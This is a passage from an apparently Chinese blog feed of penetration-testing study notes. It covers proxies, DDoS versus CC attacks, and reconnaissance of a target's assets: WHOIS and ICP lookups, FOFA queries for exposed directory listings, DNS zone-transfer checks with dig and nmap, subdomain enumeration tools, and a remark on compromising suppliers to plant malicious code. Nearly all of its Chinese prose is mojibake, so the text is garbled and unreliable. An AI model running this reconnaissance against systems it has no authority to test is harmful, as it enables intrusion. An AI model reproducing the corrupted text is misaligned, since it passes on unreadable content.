href="https://www.cloudflare.com/learning/cdn/glossary/origin-server/">æºæœåŠ¡å™¨</a>ï¼Œå¹¶ä¸”æºæœåŠ¡å™¨å°†å“åº”å®¢æˆ·ç«¯ã€‚å½“å­˜åœ¨æ­£å‘&#x2F;è½¬å‘ä»£ç†æ—¶ï¼ŒA å°†è¯·æ±‚å‘é€åˆ° Bï¼ŒB éšåå°†è¯·æ±‚è½¬å‘ç»™ Cã€‚C å°†å‘ B å‘é€å“åº”ï¼Œè€Œ B åˆ™å°†å“åº”è½¬å‘ç»™ Aã€‚</p><ul><li><p>åå‘ä»£ç†</p><blockquote><p>åå‘ä»£ç†æ˜¯ä½äºä¸€ä¸ªæˆ–å¤šä¸ª Web æœåŠ¡å™¨å‰é¢çš„æœåŠ¡å™¨ï¼Œæ‹¦æˆªæ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç¡®ä¿æ²¡æœ‰å®¢æˆ·ç«¯ç›´æ¥ä¸è¯¥æºç«™é€šä¿¡ã€‚</p></blockquote><p><img src="/../images/reverse-proxy-flow.svg" alt="åå‘ä»£ç†æµ"></p></li></ul><p>â€‹       é€šå¸¸ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€åˆ° Fï¼Œè€Œ F ä¼šç›´æ¥å°†å“åº”å‘é€åˆ° Dã€‚ä½¿ç”¨åå‘ä»£ç†ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€ç»™ Eï¼Œè€Œ E ä¼šå°†å…¶è¯·æ±‚å‘é€åˆ° F å¹¶ä» F æ¥æ”¶å“åº”ï¼Œç„¶åå°†é€‚å½“å“åº”ä¼ é€’ç»™ Dã€‚</p><table><thead><tr><th align="left"></th><th>å¯¹è±¡</th><th>ä¼˜ç‚¹</th></tr></thead><tbody><tr><td align="left">æ­£å‘&#x2F;è½¬å‘ä»£ç†</td><td>å®¢æˆ·ç«¯</td><td>åŒ¿åï¼Œç»•è¿‡è®¿é—®é™åˆ¶</td></tr><tr><td align="left">åå‘ä»£ç†</td><td>æœåŠ¡ç«¯</td><td>æ›´åŠ å®‰å…¨ï¼Œæé«˜æœåŠ¡å™¨æ€§èƒ½</td></tr></tbody></table><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><p><strong>å…¬å¼€æ¥æºæƒ…æŠ¥</strong>ï¼ˆOSINT, Open Source INTelligenceï¼‰æ˜¯ä»å…¬å¼€æ¥æºæ”¶é›†åˆ°çš„<a href="https://zh.wikipedia.org/wiki/%E6%83%85%E6%8A%A5">æƒ…æŠ¥</a> ã€‚</p><h1 id="é™æ€webå’ŒåŠ¨æ€web"><a href="#é™æ€webå’ŒåŠ¨æ€web" class="headerlink" title="é™æ€webå’ŒåŠ¨æ€web"></a>é™æ€webå’ŒåŠ¨æ€web</h1><p><a href="https://help.dedecms.com/shiyongshouce/moshi/mingci.html">https://help.dedecms.com/shiyongshouce/moshi/mingci.html</a></p><p>ä¼ªé™æ€å³æ˜¯ç½‘ç«™æœ¬èº«æ˜¯åŠ¨æ€ç½‘é¡µå¦‚.phpã€.aspã€.aspxç­‰æ ¼å¼åŠ¨æ€ç½‘é¡µæœ‰æ—¶è¿™ç±»åŠ¨æ€ç½‘é¡µè¿˜è·Ÿâ€?â€åŠ å‚æ•°æ¥è¯»å–æ•°æ®åº“å†…ä¸åŒèµ„æ–™ï¼Œä¼ªé™æ€å°±æ˜¯åšurlé‡å†™æ“ä½œ(å³rewrite)ã€‚</p><p>demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">è·³è½¬éœ€æ±‚ï¼š</span><br><span class="line">è®¿é—®http:<span class="comment">//www.kevin.com/p/123456.html  è·³è½¬æˆ  http://a.aa.com/p/123456</span></span><br><span class="line"></span><br><span class="line">é…ç½®å¦‚ä¸‹:</span><br><span class="line">rewrite ^/p/(\d+).html    http:<span class="comment">//www.kevin.com/p/$1 last;</span></span><br><span class="line"></span><br><span class="line">è§£é‡Šè¯´æ˜ï¼š</span><br><span class="line">\dæ˜¯æ•°å­—çš„æ„æ€ +æ˜¯æœ€å°‘ä¸€ä¸ª&#123;<span class="number">1</span>,&#125; <span class="number">1</span>åˆ°æ— ç©·å¤§&#123;<span class="number">1</span>,<span class="number">3</span>&#125; è¿™æ ·æ˜¯<span class="number">1</span>-<span class="number">3</span>ä½æ•°ã€‚</span><br></pre></td></tr></table></figure><h1 id="DDOSæ”»å‡»å’ŒCCæ”»å‡»"><a href="#DDOSæ”»å‡»å’ŒCCæ”»å‡»" class="headerlink" title="DDOSæ”»å‡»å’ŒCCæ”»å‡»"></a>DDOSæ”»å‡»å’ŒCCæ”»å‡»</h1><p>DDoSæ”»å‡»æ‰“çš„æ˜¯ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œè€ŒCCæ”»å‡»æ˜¯é’ˆå¯¹ç½‘ç«™çš„é¡µé¢æ”»å‡»çš„ã€‚</p><p>ç”¨æœ¯è¯­æ¥è¯´å°±æ˜¯ï¼Œä¸€ä¸ªæ˜¯WEBç½‘ç»œå±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDDoSï¼‰ï¼Œä¸€ä¸ªæ˜¯WEBåº”ç”¨å±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆCCï¼‰ã€‚</p><p>ç½‘ç»œå±‚å°±æ˜¯åˆ©ç”¨è‚‰é¸¡çš„æµé‡å»æ”»å‡»ç›®æ ‡ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œé’ˆå¯¹æ¯”è¾ƒæœ¬æºçš„ä¸œè¥¿å»æ”»å‡»ï¼ˆé€šä¿¡ä¿¡é“ï¼‰ï¼ŒæœåŠ¡å™¨ç˜«ç—ªäº†ï¼Œé‚£ä¹ˆè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™è‚¯å®šä¹Ÿä¸èƒ½æ­£å¸¸è®¿é—®äº†ã€‚</p><p>è€Œåº”ç”¨å±‚å°±æ˜¯æˆ‘ä»¬ç”¨æˆ·çœ‹å¾—åˆ°çš„ä¸œè¥¿ï¼Œå°±æ¯”å¦‚è¯´ç½‘é¡µï¼ŒCCæ”»å‡»å°±æ˜¯é’ˆå¯¹ç½‘é¡µæ¥æ”»å‡»çš„ï¼ŒCCæ”»å‡»æœ¬èº«æ˜¯æ­£å¸¸è¯·æ±‚ï¼Œç½‘ç«™åŠ¨æ€é¡µé¢çš„æ­£å¸¸è¯·æ±‚ä¹Ÿä¼šå’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„ï¼Œå½“è¿™ç§â€æ­£å¸¸è¯·æ±‚â€è¾¾åˆ°ä¸€ç§ç¨‹åº¦çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨å°±ä¼šå“åº”ä¸è¿‡æ¥ï¼Œä»è€Œå´©æºƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•æµç¨‹</title>
      <link href="/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ä½“æµç¨‹"><a href="#æ€»ä½“æµç¨‹" class="headerlink" title="æ€»ä½“æµç¨‹"></a>æ€»ä½“æµç¨‹</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="å›¾ç‰‡.png"></p><p>â€‹<a href="https://www.freebuf.com/column/196291.html">æ¸—é€æµ‹è¯•çš„8ä¸ªæ­¥éª¤ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ˜ç¡®ç›®æ ‡ï¼šä¸å®¢æˆ·äº¤æµï¼Œå¾—åˆ°æ¸—é€çš„èŒƒå›´ï¼Œè§„åˆ™å’Œéœ€æ±‚</span><br><span class="line">ä¿¡æ¯æ”¶é›†ï¼šèµ„äº§æ”¶é›†+æ•æ„Ÿä¿¡æ¯æ”¶é›†+æŒ‡çº¹è¯†åˆ«</span><br><span class="line">æ¼æ´æ¢æµ‹å’Œä¿¡æ¯åˆ†æï¼šæ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</span><br><span class="line">è·å–æ‰€éœ€ï¼šåæ¸—é€</span><br><span class="line">ä¿¡æ¯æ•´ç†å’Œå½¢æˆæŠ¥å‘Šï¼šäº§å‡ºæŠ¥å‘Š</span><br></pre></td></tr></table></figure><h1 id="èµ„äº§æ”¶é›†"><a href="#èµ„äº§æ”¶é›†" class="headerlink" title="èµ„äº§æ”¶é›†"></a>èµ„äº§æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><p><strong>å°½å¯èƒ½çš„æ‰©å¤§æ”»å‡»é¢</strong></p><h2 id="ä¸»åŸŸåæ”¶é›†"><a href="#ä¸»åŸŸåæ”¶é›†" class="headerlink" title="ä¸»åŸŸåæ”¶é›†"></a>ä¸»åŸŸåæ”¶é›†</h2><h3 id="ICPå¤‡æ¡ˆæŸ¥è¯¢"><a href="#ICPå¤‡æ¡ˆæŸ¥è¯¢" class="headerlink" title="ICPå¤‡æ¡ˆæŸ¥è¯¢"></a>ICPå¤‡æ¡ˆæŸ¥è¯¢</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>ICPå¤‡æ¡ˆæ˜¯æŒ‡ç½‘ç«™åœ¨ä¿¡æ¯äº§ä¸šéƒ¨æäº¤ç½‘ç«™ä¿¡æ¯è¿›è¡Œå®˜æ–¹è®¤å¯ã€‚</p><p>æ‰€ä»¥å›½å†…ä½¿ç”¨å›½å†…æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œéƒ½å¿…é¡»è¦å…ˆåŠç†ICPå¤‡æ¡ˆåæ‰å¯ä»¥ä¸Šçº¿ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡ä¼ä¸šçš„å¤‡æ¡ˆä¿¡æ¯ï¼Œå¯ç›´æ¥è·å–åˆ°ç›®æ ‡ä¼ä¸šæ³¨å†Œäº†å“ªäº›åŸŸåï¼Œä»è€Œå¢åŠ å¯æ¸—é€çš„ç›®æ ‡èŒƒå›´ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IPåœ°å€&#x2F;åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ</a></p><p><a href="https://www.gsxt.gov.cn/index.html">å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ</a></p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li><li><p>å·¥å…·</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œè¾“å‡ºICPå¤‡æ¡ˆæ‰€æœ‰å…³è”åŸŸå</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p><code>WHOIS</code>æ˜¯ç”¨æ¥æŸ¥è¯¢äº’è”ç½‘ä¸­åŸŸåçš„IPä»¥åŠæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡çš„WHOISä¿¡æ¯ï¼Œå¯ä»¥å¯¹è”ç³»äººã€è”ç³»é‚®ç®±ç­‰ä¿¡æ¯è¿›è¡ŒåæŸ¥ï¼Œå¯ä»¥è·å–æ›´å¤šç›¸å…³çš„åŸŸåä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://whois.chinaz.com/">åŸŸåWhoisæŸ¥è¯¢ - ç«™é•¿ä¹‹å®¶</a></p><p><a href="http://whois.bugscaner.com/">åœ¨çº¿åŸŸåWhoisæŸ¥è¯¢,ç½‘ç«™WhoisåæŸ¥-åœ¨çº¿ç«™é•¿å·¥å…· bugscaner</a></p><p><a href="https://who.is/">WHOIS Search, Domain Name, Website, and IP Tools - Who.is</a></p></li></ul><h3 id="è‚¡æƒä¿¡æ¯"><a href="#è‚¡æƒä¿¡æ¯" class="headerlink" title="è‚¡æƒä¿¡æ¯"></a>è‚¡æƒä¿¡æ¯</h3><ul><li><p>æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢è‚¡æƒä¿¡æ¯ï¼Œæˆ–è€…è‚¡æƒç©¿é€å›¾ï¼Œå¯»æ‰¾å­å…¬å¸å’Œå­™å…¬å¸ç­‰ï¼Œä¸€èˆ¬å¯¹å¤–æŠ•èµ„è¶…è¿‡50%æˆ–è€…æœ‰è¡Œæ”¿æƒé™çš„éƒ½å¯ä»¥ç®—ç›®æ ‡</p></li><li><p>æŸ¥è¯¢ç½‘ç«™</p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li></ul><h3 id="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP"><a href="#å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP" class="headerlink" title="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP"></a>å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¾®ä¿¡/æ”¯ä»˜å®å°ç¨‹åº</span><br><span class="line">å¾®ä¿¡å…¬ä¼—å·</span><br><span class="line">æ‰‹æœºAPPï¼šæŠ“åŒ…ï¼Œå†å²ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><h3 id="DNSå…±äº«è®°å½•æŸ¥è¯¢"><a href="#DNSå…±äº«è®°å½•æŸ¥è¯¢" class="headerlink" title="DNSå…±äº«è®°å½•æŸ¥è¯¢"></a>DNSå…±äº«è®°å½•æŸ¥è¯¢</h3><ul><li><p>åŸç†</p><p>æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸå</p></li><li><p>æ­¥éª¤</p><ol><li><p>é¦–å…ˆæŸ¥è¯¢ç›®æ ‡æ˜¯å¦å­˜åœ¨è‡ªå»ºçš„NSæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>å°†éæƒå¨åº”ç­”ä¸­çš„nsæœåŠ¡å™¨å¸¦åˆ°ä¸‹é¢çš„ç½‘ç«™æŸ¥è¯¢</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="ç½‘ç»œç©ºé—´æµ‹ç»˜"><a href="#ç½‘ç»œç©ºé—´æµ‹ç»˜" class="headerlink" title="ç½‘ç»œç©ºé—´æµ‹ç»˜"></a>ç½‘ç»œç©ºé—´æµ‹ç»˜</h3><p>å¤šç”¨å‡ ä¸ªç½‘ç»œç©ºé—´æœç´¢å¼•æ“</p><p>FoFaè¯­æ³•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title=&quot;&quot;  # æ ‡é¢˜   </span><br><span class="line">title=&quot;Directory listing for /&quot; # ç›®å½•éå†</span><br><span class="line">tile=&quot;outlook&quot; / &quot;tomcat&quot; / &quot;weblogic&quot;  # æŸ¥æ‰¾ç‰¹å®šåº”ç”¨</span><br><span class="line">server=&quot;WebSockify Python&quot; &amp;&amp; title=&quot;Directory listing for /&quot;  # æŸ¥æ‰¾novncï¼ˆnovncè¿è¡Œåœ¨å®¹å™¨é‡Œï¼‰</span><br><span class="line"></span><br><span class="line">header=xxx # è¯·æ±‚å¤´  æ„Ÿè§‰hunterçš„å¤š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cert=è‹±æ–‡ç¼©å†™   # è¯ä¹¦å†…å®¹</span><br><span class="line">cert.subject=è‹±æ–‡ç¼©å†™ # è¯ä¹¦æŒæœ‰è€…</span><br><span class="line">cert.issuer=è‹±æ–‡ç¼©å†™ # è¯ä¹¦é¢å‘è€…</span><br><span class="line"></span><br><span class="line">body=xxx  # é¡µé¢å†…å®¹</span><br><span class="line"></span><br><span class="line">is_honeypot=false æ’é™¤èœœç½æ•°æ®ï¼Œä»…é™FOFAé«˜çº§ä¼šå‘˜ä½¿ç”¨</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¨¡ç³Šæœç´¢ ä»…é™ä¸ªäººç‰ˆåŠä»¥ä¸Šæˆ–æ¶ˆè€—Fç‚¹ä½¿ç”¨</span></span><br><span class="line">= â†’ *= è¡¨ç¤ºä½¿ç”¨æ¨¡ç³Šæœç´¢åŠŸèƒ½</span><br><span class="line">* è¡¨ç¤ºåŒ¹é…çš„æ•°é‡ä¸å—é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿ 0 ä¸ªã€1 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</span><br><span class="line">? ä»…ä»…å¯æ›¿ä»£ 1 ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">https://github.com/FofaInfo/Awesome-FOFA/blob/main/Basic%20scenario/Basic%20scenario_ZH/FOFA%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF.md</span><br></pre></td></tr></table></figure><h3 id="ä¾›åº”é“¾å…¬å¸"><a href="#ä¾›åº”é“¾å…¬å¸" class="headerlink" title="ä¾›åº”é“¾å…¬å¸"></a>ä¾›åº”é“¾å…¬å¸</h3><p><a href="https://xz.aliyun.com/t/10531">è®°ä¸€æ¬¡é€šè¿‡ä¾›åº”é“¾æ‹¿åˆ°ç›®æ ‡åå°æƒé™çš„è¿‡ç¨‹ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg">https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg</a></p><ul><li><p>ä¸ºä»€ä¹ˆ</p><p>è¯•æƒ³ä¸€ä¸‹ï¼Œç›®æ ‡ä½¿ç”¨ä¾›åº”å•†æä¾›çš„è½¯ä»¶ï¼Œé‚£ä¹ˆè¿™äº›è½¯ä»¶æ˜¯å—åˆ°ä¿¡ä»»çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”»å‡»ä¾›åº”å•†ï¼Œå¹¶åœ¨è½¯ä»¶ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œè¿™æ ·ç›®æ ‡åœ¨è¿è¡Œè½¯ä»¶æ—¶ä¹Ÿä¼šè¿è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ã€‚</p><p>å¹¶ä¸”ä¾›åº”å•†ä¿å­˜äº†ç›®æ ‡çš„å„ç§ä¿¡æ¯ã€‚</p></li><li><p>æ‰‹æ®µ</p><ul><li>ç½‘ç«™é¡µåº•çš„å¤‡æ¡ˆï¼Œç‰ˆæƒä¿¡æ¯<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>æ‹›æ ‡æ–‡ä»¶</li></ul></li></ul><h3 id="èšåˆå·¥å…·"><a href="#èšåˆå·¥å…·" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>ä¸€æ¬¾åŸºäºå„å¤§ä¼ä¸šä¿¡æ¯APIçš„å·¥å…·ï¼Œè§£å†³åœ¨é‡åˆ°çš„å„ç§é’ˆå¯¹å›½å†…ä¼ä¸šä¿¡æ¯æ”¶é›†éš¾é¢˜ã€‚ä¸€é”®æ”¶é›†æ§è‚¡å…¬å¸ICPå¤‡æ¡ˆã€APPã€å°ç¨‹åºã€å¾®ä¿¡å…¬ä¼—å·ç­‰ä¿¡æ¯èšåˆå¯¼å‡ºã€‚</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><h3 id="æšä¸¾çˆ†ç ´"><a href="#æšä¸¾çˆ†ç ´" class="headerlink" title="æšä¸¾çˆ†ç ´"></a>æšä¸¾çˆ†ç ´</h3><ul><li><p>åŸç†</p><p>é€šè¿‡ä¸æ–­çš„æ‹¼æ¥å­—å…¸ä¸­çš„å­åŸŸåå‰ç¼€å»æšä¸¾åŸŸåçš„Aè®°å½•ï¼Œå†å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯è¯¥æ–¹æ³•ä¸€èˆ¬éœ€è¦è§£å†³æ³›è§£æé—®é¢˜ã€‚</p></li><li><p>åœ¨çº¿ç½‘ç«™</p><p><a href="http://z.zcjun.com/">åœ¨çº¿å­åŸŸåçˆ†ç ´-å­æˆå›æä¾›</a></p></li></ul><h3 id="è¯ä¹¦é€æ˜åº¦"><a href="#è¯ä¹¦é€æ˜åº¦" class="headerlink" title="è¯ä¹¦é€æ˜åº¦"></a>è¯ä¹¦é€æ˜åº¦</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>è¯ä¹¦é€æ˜æ€§ï¼ˆCertificate Transparencyï¼ŒCTï¼‰æ˜¯ Google çš„å…¬å¼€é¡¹ç›®ï¼Œé€šè¿‡è®©åŸŸæ‰€æœ‰è€…ã€CA å’ŒåŸŸç”¨æˆ·å¯¹ SSL è¯ä¹¦çš„å‘è¡Œå’Œå­˜åœ¨è¿›è¡Œå®¡æŸ¥ï¼Œæ¥çº æ­£è¿™äº›åŸºäºè¯ä¹¦çš„å¨èƒã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>å› ä¸ºæ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥è®¿é—®åˆ°å…¶ä¸­çš„CA è¯ä¹¦ï¼ŒåŒ…å«äº†åŸŸåã€å­åŸŸåã€é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNSå…¬å¼€æ•°æ®é›†"><a href="#DNSå…¬å¼€æ•°æ®é›†" class="headerlink" title="DNSå…¬å¼€æ•°æ®é›†"></a>DNSå…¬å¼€æ•°æ®é›†</h3><p>åˆ©ç”¨å·²æœ‰å…¬å¼€çš„æ‰«ææ•°æ®é›†ï¼Œå¯¹å­åŸŸåä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-åŸŸä¼ é€"><a href="#DNS-åŸŸä¼ é€" class="headerlink" title="DNS åŸŸä¼ é€"></a>DNS åŸŸä¼ é€</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>DNSæœåŠ¡å™¨åˆ†ä¸ºä¸»æœåŠ¡å™¨ï¼Œå¤‡ä»½æœåŠ¡å™¨ï¼Œç¼“å­˜æœåŠ¡å™¨ã€‚</p><p><strong>åŸŸä¼ é€</strong>æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨ä¸Šå¤åˆ¶æ•°æ®ï¼Œç„¶åæ›´æ–°è‡ªèº«çš„æ•°æ®åº“ï¼Œä»¥è¾¾åˆ°æ•°æ®åŒæ­¥çš„ç›®çš„ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å¢åŠ å†—ä½™ï¼Œä¸€æ—¦ä¸»æœåŠ¡å™¨å‡ºç°é—®é¢˜å¯ç›´æ¥è®©å¤‡ä»½æœåŠ¡å™¨åšå¥½æ”¯æ’‘å·¥ä½œã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>è‹¥ DNS æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ã€‚</p></li><li><p>æ£€æµ‹æ–¹æ³•</p><ul><li><p>digè¯·æ±‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰¾åˆ°NSæœåŠ¡å™¨</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘é€axfrè¯·æ±‚</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmapè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="æœç´¢å¼•æ“"><a href="#æœç´¢å¼•æ“" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h3><ul><li><p>ä¼ ç»Ÿæœç´¢å¼•æ“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx æ’é™¤å“ªäº›å­åŸŸ)</span><br></pre></td></tr></table></figure></li><li><p>ç½‘ç»œç©ºé—´æµ‹ç»˜</p><p><a href="https://fofa.info/">fofa</a></p><p><a href="https://hunter.qianxin.com/">é¹°å›¾å¹³å°</a></p></li></ul><h3 id="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"><a href="#ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°" class="headerlink" title="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"></a>ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°</h3><ul><li><p><a href="https://securitytrails.com(uiå¥½çœ‹,ç»“æœæœ€å¤š)/">https://securitytrails.comï¼ˆUIå¥½çœ‹ï¼Œç»“æœæœ€å¤šï¼‰</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="èšåˆå·¥å…·-1"><a href="#èšåˆå·¥å…·-1" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><h4 id="æ”¶é›†å·¥å…·"><a href="#æ”¶é›†å·¥å…·" class="headerlink" title="æ”¶é›†å·¥å…·"></a>æ”¶é›†å·¥å…·</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>ä¸€æ¡é¾™ï¼Œéœ€è¦é…ç½®apiï¼Œé…åˆä»£ç†ä½¿ç”¨æ•ˆæœæ›´ä½³</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230508203149442-1685533751888.png" alt="image-20230508203149442"></p></li><li><p><code>Amass</code></p><p>æ„Ÿè§‰é€Ÿåº¦æ…¢</p><p>æ‰‹å†Œï¼š<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md</a></p><p>domainå¯è§†åŒ–</p><p><img src="/../images/maltego_results-1685533751888.png" alt="Maltego results"></p></li><li><p><code>ksubdomain</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ksubdomain -d seebug.org -full -summary</span><br></pre></td></tr></table></figure></li><li><p><code>subfinder</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">subfinder -silent -d hackerone.com </span><br></pre></td></tr></table></figure></li></ul><h4 id="æ¢æ´»å·¥å…·"><a href="#æ¢æ´»å·¥å…·" class="headerlink" title="æ¢æ´»å·¥å…·"></a>æ¢æ´»å·¥å…·</h4><ul><li><code>httpx</code></li></ul><p>è”åŠ¨</p><ul><li>subfinder é€šè¿‡å„ç§æœç´¢å¼•æ“è·å–åŸŸå</li><li>ksubdomain éªŒè¯åŸŸå</li><li>httpx httpè¯·æ±‚è·å¾—æ•°æ®,éªŒè¯å­˜æ´»</li></ul><p><img src="/../images/image-20230508205053563-1685533751888.png" alt="image-20230508205053563"></p><h2 id="IPæ®µä¿¡æ¯æ”¶é›†"><a href="#IPæ®µä¿¡æ¯æ”¶é›†" 